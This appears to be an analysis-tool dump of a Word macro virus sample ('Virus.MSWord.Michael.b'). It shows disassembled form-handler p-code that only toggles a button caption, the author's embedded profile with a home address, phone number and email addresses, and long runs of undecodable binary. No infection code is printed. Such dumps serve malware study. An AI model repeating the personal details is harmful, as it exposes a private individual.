' 	EndSub 
' Line #68:
' Line #69:
' 	FuncDefn (Private Sub UserForm_Activate())
' Line #70:
' 	LitDI2 0x0000 
' 	Ld TextBox1 
' 	MemSt CurLine 
' Line #71:
' 	EndSub 
' Line #72:
' Macros/VBA/Character2 - 2188 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #35:
' 	Dim (Static) 
' 	VarDefn B (As Boolean)
' Line #36:
' Line #37:
' 	Ld B 
' 	IfBlock 
' Line #38:
' 	LitStr 0x0005 "Close"
' 	Ld CommandButton1 
' 	MemSt Caption 
' Line #39:
' 	ElseBlock 
' Line #40:
' 	LitStr 0x0004 "Open"
' 	Ld CommandButton1 
' 	MemSt Caption 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	Ld B 
' 	Not 
' 	St B 
' Line #43:
' Line #44:
' 	EndSub 
' Line #45:
' Line #46:
' 	FuncDefn (Private Sub UserForm_Activate())
' Line #47:
' 	LitDI2 0x0000 
' 	Ld TextBox1 
' 	MemSt CurLine 
' Line #48:
' 	EndSub 
' Line #49:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Michael I. Buen
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tab3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Programmer's Profile

         Real Mode Name:  Michael I. Buen 
Protected Mode Name: Mycklangelo "The Skulltor\n" Buenarotti
                     Birthday: November 5, 1976
                     Address: Block 6 Lot 3 Hauskon Homes, Daang Amaya,          
                                     Tanza Cavite City
                 Telephone: (046) 505-17-39            
          e-mail address: mycklangelo@yahoo.com;mcklangelo@hotmail.com
         Group Affiliated: GRAMMERSoft, Elevated Ideas
  Group Not Affiliated: AMACConda Group of Companies
       Services Offered: Programming, Debugging      
Services Not Offered: Hacking, Pest-Control
            

About Me:
      I'm not a virus programmer per se, I'm just a dedicated programmer and a serious learner.

My Favorite Principle in Writing (Code):
    "A book is finished not when nothing more can be added, but when nothing can be remove from it." -- Code Complete: Steve McConnell

My Interest and Activites:
       Reading, Analyzing, Hacking, Reading, Analyzing, Reading, Reading, Analyzing, Hacking, Analyzing, Analyzing, Analyzing, Analyzing, (program halt)

Favorite Quote:
      "The cure for boredom is curiosity.  There is no cure for curiosity"


*** ACNOWLEDGMENT ***

I'm thanking Byron for sharing his computer and ideas, book and time, I'm using his computer every Saturday and Sunday just to write this program.  And to all GRAMMERSoft especially LIENQ, I know what the hell of hacking we are all doing but nevertheless it is still legitimate learning.  And to PC-Cillin, the anti-virus software that gave me a hint that events of Word and Excel can be hooked by naming your procedures with the name of the event.  And to Rivermaya, Eraserheads, Renz Verano who's continuing to write Original Pilipino Music that calms our soul.  And Since I haven't yet finished my Thesis and Automata, I'll consider this as my quick software project, so I'll have to thanks all those beta tester of this virus, you can send me you comment and ratings about my program.  And to Mark ( he's currently a freshman computer science at Adamson University ) my brother, sorry I haven't include your picture here, the program has grown too large already.  Kung nagkataon ang pangalan ng virus na ito ay "Mark My Word".


-- "Be a Superlearner, Enroll at AMACConda Computer College"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
